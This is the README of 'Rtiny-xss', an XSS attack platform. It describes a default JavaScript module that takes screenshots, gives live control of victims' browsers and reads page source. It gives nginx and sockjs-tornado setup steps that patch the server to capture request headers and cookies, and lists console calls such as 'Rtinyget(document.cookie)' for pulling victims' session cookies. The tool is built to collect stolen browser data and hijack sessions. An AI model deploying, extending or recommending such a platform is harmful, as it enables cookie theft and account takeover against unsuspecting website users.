# Rtiny-xss

一个xss轮子。

### 架构
```
├── rtiny(控制器，配置文件以及函数)
  |—— ...
  |—— config.php(配置文件)
├── themes(模板与静态文件)
  |——static(静态文件)
  |——get.html(默认js模块)
  |——...
├── index.py(运行Server)
├── README.md(项目说明)
```

默认js模块 支持屏幕截屏，在线控制，源码读取，探针

### 安装与使用

- 运行环境
  - tornado 4.2
  - python 2.7
  - nginx
  - torndb
  - sockjs-tornado(https://github.com/mrjoes/sockjs-tornado)
  - supervisor(非必须，但强烈建议)
- 搭建
  - **必须使用nginx反向代理**
  
    其配置如下
  ```
  http{
  .....
   # 若支持https , 下同
   # map $http_upgrade $connection_upgrade {
	 #  default upgrade;
	 #	  '' close;
	.....
	}
   server
  {
  	listen 80;
	  server_name xxx.com;
	  #listen 443 ssl;         
	  #ssl_certificate_key /*****.key;
	  #ssl_certificate /*******.crt;
	  location / {
	  	proxy_redirect off;
	  	proxy_set_header Host $host;
	  	proxy_set_header remote-ip $remote_addr;
	  	proxy_pass http://127.0.0.1:your port;
	  	proxy_http_version 1.1;
	  	#proxy_set_header Upgrade $http_upgrade;
      #proxy_set_header Connection "upgrade";
	  }
  }
  ```
  
  - **修改sockjs-tornado**
  
  /sockjs/tornado/transports/base.py
  ```
  from sockjs.tornado import session


  class BaseTransportMixin(object):
    """Base transport.

    Implements few methods that session expects to see in each transport.
    """

    name = 'override_me_please'
    sock_headers = ''
    sock_cookie = ''
    def get_conn_info(self):
        """Return `ConnectionInfo` object from current transport"""
        BaseTransportMixin.sock_headers = self.request.headers
        BaseTransportMixin.sock_cookies = self.get_secure_cookie('username') or ''
        return session.ConnectionInfo(self.request.remote_ip,
                                      self.request.cookies,
                                      self.request.arguments,
                                      self.request.headers,
                                      self.request.path)

    def session_closed(self):
        """Called by the session, when it gets closed"""
        pass
  ```
  
  - 修改 tornado ,非必须，不修改的话添加模块代码时会影响美观。
  
  将Template类的构造函数中 这几行注释掉。
  
  ···
  if compress_whitespace is None:
5
        compress_whitespace = name.endswith(".html") or \
6
            name.endswith(".js")
  ···
  
  - API
    - module
      + 自定义参数 ```{set.*}```
      + 接收数据 ```Rtinysend.xx = xx;```
      
      若异步，请使用ajax post receive参数 到项目地址(支持json)
      + AJAX 
      ```
      ajax({
					'type': 'POST/GET',
					'url': 'xxx',
					'data': "xxx",
		  });
      ```
      + dom加载后执行 ```domready(function(){xx}） ```
      + 不用担心低版本ie浏览器不支持 json， 放心的使用它吧。
      
    - console
      + 获取数据 ```Rtinyget(document.cookie)```
      + 更新截图 ```pic(window.document.body,'')```
  
